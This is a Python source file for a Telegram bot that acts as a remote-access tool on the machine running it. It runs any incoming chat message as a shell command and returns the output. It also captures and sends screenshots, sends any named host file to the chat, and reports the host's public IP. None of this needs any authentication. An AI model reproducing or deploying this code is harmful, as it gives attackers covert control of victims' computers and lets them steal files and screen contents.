import subprocess as s
import os
from mss import mss
import requests
from telegram.ext import Updater, CommandHandler, MessageHandler, Filters
# from google.colab import userdata
# import asyncio

#This would show us that little animation while processing messages...
from functools import wraps

def send_action(action):
    def decorator(func):
        @wraps(func)
        def command_func(update, context, *args, **kwargs):
            context.bot.send_chat_action(chat_id=update.effective_message.chat_id, action=action)
            return func(update, context,  *args, **kwargs)
        return command_func
    return decorator
###


#IMPORTANT SEE HERE !!!
# Define your Telegram bot token
# TOKEN = userdata.get('XADMIN')

# Define the command handlers
@send_action('typing')
def start(update, context):
    update.message.reply_html(f'''<pre class="spoiler">Hi {(update.effective_user.username).upper()}
Type help for commands</pre>.
''')


@send_action('record_video_note')
def main(update, context):
  text : str = update.message.text
  if text.startswith('@'):
    file_name = text.replace("@","")
    
    #document send remotely
    if os.path.isfile(f"./{file_name}"):
      with open(file_name, 'rb') as f:
        return context.bot.send_document(chat_id=update.effective_chat.id, document=f)
      
    else :
      return update.message.reply_html("<pre>the file does not exists</pre>")
    
  elif text.lower().startswith('ss') or text.lower().startswith('screenshot') :
    with mss() as sct:
      ss = sct.shot()
      with open(ss, 'rb') as ss:
        return context.bot.send_document(chat_id=update.effective_chat.id, document=ss)

  elif text.lower().startswith('dir') or text.lower().startswith('ls') :
     return update.message.reply_text(msg_handler(text))
  
  else:
    return update.message.reply_html(msg_handler(text))


#directory changer
def change_dir(inp:str) -> str:
    cwd = inp.split(" ")
    os.chdir(cwd[1])
    return os.getcwd()


#for shell based functionings
def shell(inp : str) :
  if "cd" in inp:
      new_dir = change_dir(inp)
      return new_dir
      # await update.message.reply_text(new_dir)
  else:
      out = s.run(inp,text = True, shell=True, capture_output=True)
      final = out.stdout.replace("\n\n\n\n","\n\n")
      if out.returncode == 0:
          # await update.message.reply_text(final)
          return final
      else:
          return (f"ERROR : {out.stderr}")

def get_ip():
    ip_address = requests.get("https://api.ipify.org").text
    return f"IP Address: {ip_address}"


def msg_handler(text : str):
  if 'ip' in text:
    return get_ip()
  elif 'help' in text.lower():
    return '''

windows <pre>systeminfo</pre>	linux <pre>uname -a</pre>	Shows detailed information about your system, including operating system version, hardware specifications, and network configuration (Windows) or kernel name, hostname, release, version, and machine architecture (Linux).


windows <pre>dir</pre>	linux<pre>ls</pre>	Lists the contents of the current directory, including filenames and subdirectories.


windows<pre>cd directory_name</pre>	 linux<pre>cd directory_name</pre>	Navigates to a specific directory within the file system. Use .. to move up one level in the directory structure.


windows<pre>cls</pre>	 linux<pre>clear</pre>	Clears the contents of the terminal window (Windows) or the entire terminal screen (Linux).



for taking Screenshot : use 
<pre>ss or screenshot</pre> 

for IP address : use 
<pre>ip</pre> 

for remotely downloading a file : use 
<pre>@the_filename</pre> 
<b>CASE SENSITIVE</b>

for
  '''
  
  else :
    return shell(text)





# Create the Updater and pass in your bot's token
updater = Updater(TOKEN, use_context=True)

# Get the dispatcher to register handlers
dispatcher = updater.dispatcher

# Add command handlers
dispatcher.add_handler(CommandHandler("start", start))
# dispatcher.add_handler(CommandHandler("help", help))
dispatcher.add_handler(MessageHandler(Filters.text, main))
# dispatcher.add_handler(CommandHandler("screenshot", screenshot))
dispatcher.add_handler(CommandHandler("ip", get_ip))

# Start the Bot
print("running...")
updater.start_polling()
updater.idle()
